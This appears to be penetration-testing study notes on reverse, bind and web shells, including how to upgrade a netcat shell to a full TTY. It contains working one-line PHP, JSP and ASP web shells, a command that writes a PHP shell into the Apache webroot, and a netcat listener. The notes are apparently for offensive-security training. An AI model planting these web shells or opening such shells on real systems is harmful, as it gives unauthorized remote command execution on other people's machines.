# Payload all the things repo
https://github.com/swisskyrepo/PayloadsAllTheThings

Once we compromise a system and exploit a vulnerability to execute commands on the compromised hosts remotely, we usually need a method of communicating with the system not to have to keep exploiting the same vulnerability to execute each command. To enumerate the system or take further control over it or within its network, we need a reliable connection that gives us direct access to the system's shell, i.e., Bash or PowerShell, so we can thoroughly investigate the remote system for our next move.

One way to connect to a compromised system is through network protocols, like SSH for Linux or WinRM for Windows, which would allow us a remote login to the compromised system. However, unless we obtain a working set of login credentials, we would not be able to utilize these methods without executing commands on the remote system first, to gain access to these services in the first place.

- Reverse Shell: Connects back to our system and gives us control through a reverse connection;
- Bind Shell: Waits for us to connect to it and gives us control once we do;
- Web Shell: Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

# Reverse shell

A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port, say port 1234. With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e., Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system.

`nc -lvnp 1234`

- -l: Listen mode, to wait for a connection to connect to us;
- -v: Verbose mode, so that we know when we receive a connection;
- -n: Disable DNS resolution and only connect from/to IPs, to speed up the connection;
- -p 1234: Port number netcat is listening on, and the reverse connection should be sent to.

# Bind shell

Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.
Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host's shell, i.e., Bash or PowerShell'to that port. We have to connect to that port with netcat, and we will get control through a shell on that system.

Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

# Upgrading TTY

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

There are multiple methods to do this. For our purposes, we will use the python/stty method. In our netcat shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:

`python -c 'import pty; pty.spawn("/bin/bash")'`

After we run this command, we will hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:

- `stty raw -echo`
- `fg`
- `export SHELL=bash`
- `export TERM=xterm-256color`

Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

`echo $TERM`
`stty size`

The first command showed us the TERM variable, and the second shows us the values for rows and columns, respectively. Now that we have our variables, we can go back to our netcat shell and use the following command to correct them:

`export TERM=xterm-256color`
`stty rows 67 columns 318`

# Web shell

The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.

First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

- PHP: `<?php system($_REQUEST["cmd"]); ?>`
- jsp: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
- asp: `<% eval request("cmd") %>`

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

- Apache: /var/www/html/
- Nginx: /usr/local/nginx/html/
- IIS: c:\inetpub\wwwroot\
- XAMPP: C:\xampp\htdocs\

We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:

`echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`

Once we write our web shell, we can either access it through a browser or by using cURL.
